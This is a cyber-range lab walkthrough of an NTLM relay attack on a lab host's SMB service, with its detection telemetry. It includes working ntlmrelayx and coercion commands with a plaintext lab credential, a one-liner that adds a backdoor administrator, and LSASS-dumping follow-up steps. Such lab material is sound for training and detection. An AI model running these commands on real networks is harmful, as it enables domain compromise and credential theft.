# WT#022 — NTLM Relay to SMB

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | 192.168.77.23 (mbr02.range.local) |
| **Domain** | range.local |
| **Starting Credential** | analyst_dfir / An@lyst_DF1R! (cadre.local) |
| **Tools Required** | impacket-ntlmrelayx, coercer / PetitPotam / dfscoerce / dementor.py |
| **Certifications** | OSCP+, CAPE |
| **MITRE ATT&CK** | T1557.001 |
| **Difficulty** | Medium |

## Prerequisites
- SMB signing DISABLED on mbr02 (CADRE misconfiguration — no SMB signing enforced)
- Ability to coerce NTLM from a privileged account (dc01$ via WT#017-020, or any domain user)
- Network connectivity from Kali (192.168.77.41) to mbr02 (192.168.77.23) and to target DC
- SMB signing NOT enforced on Kali (default)

## Attack Steps

### Step 1: Start ntlmrelayx targeting mbr02 SMB
```bash
impacket-ntlmrelayx -t smb://mbr02.range.local -smb2support -i
```

The `-i` flag starts an interactive SMB shell on successful relay. Alternatively use `-c` for command execution:
```bash
impacket-ntlmrelayx -t smb://mbr02.range.local -smb2support -c "whoami > C:\pwned.txt"
```

### Step 2: Coerce NTLM authentication from a target account
In a separate terminal, trigger coercion. The relayed credential must have local admin rights on mbr02:

```bash
# Coerce from dc01$ (DC machine account has admin rights on domain members by default):
python3 dementor.py 192.168.77.41 dc01.cadre.local -d cadre.local -u analyst_dfir -p An@lyst_DF1R!

# Or using coercer:
coercer coerce -l 192.168.77.41 -t 192.168.77.10 -d cadre.local -u analyst_dfir -p An@lyst_DF1R! --spoolsample
```

### Step 3: Interactive SMB shell
If relay succeeds with `-i` flag, ntlmrelayx provides an interactive SMB shell:
```
[*] Authenticating against smb://mbr02.range.local as CADRE\DC01$ SUCCEED
[*] Started interactive SMB client shell via SOCKS at 127.0.0.1:1080
smb $> whoami
nt authority\system
smb $> dir \\mbr02.range.local\C$
```

### Step 4: Execute commands as SYSTEM
```bash
# Using the SOCKS proxy from relay:
impacket-smbexec -no-pass cadre.local/dc01$@mbr02.range.local
```

Alternative with one-shot command:
```bash
impacket-ntlmrelayx -t smb://mbr02.range.local -smb2support -c "net user pwned P@ssw0rd! /add && net localgroup Administrators pwned /add"
```

## Post-Exploitation Chain
- SYSTEM on mbr02 → access SCCM database, WSUS, MSSQL
- Dump LSASS on mbr02 for additional credentials (WT#032 token impersonation)
- Lateral movement from mbr02 to other VMs using harvested credentials

## Telemetry Verification
| Source | What to look for |
|--------|-----------------|
| **Windows Security (mbr02)** | Event 4624 (incoming NTLM auth from Kali via SMB), Event 4672 (SYSTEM logon), Event 5140 (SMB share access) |
| **Sysmon (mbr02)** | Event 3 (SMB connection from Kali), Event 1 (process creation from relayed commands) |
| **Windows Security (dc01)** | Event 5156 (outbound coercion traffic), Event 4662 (coercion RPC) |
| **Zeek (monitor)** | `smb_files.log`, `ntlm.log` showing relayed authentication, `dce_rpc.log` (coercion) |
| **Suricata (monitor)** | SMB relay detection, NTLM relay signature matches |
| **Arkime (monitor)** | Full PCAP of coercion + SMB relay traffic flow |
| **Elastic / Kibana** | `logs-system.security-*`, `logs-windows.sysmon_operational-*`, `logs-zeek.smb-*` |
| **Detection rule** | `cadre-006-ntlm-relay` (threshold — repeated NTLM authentications) |

## Status
**CONFIGURED** — SMB signing disabled on mbr02. Relay tools installed on Kali.
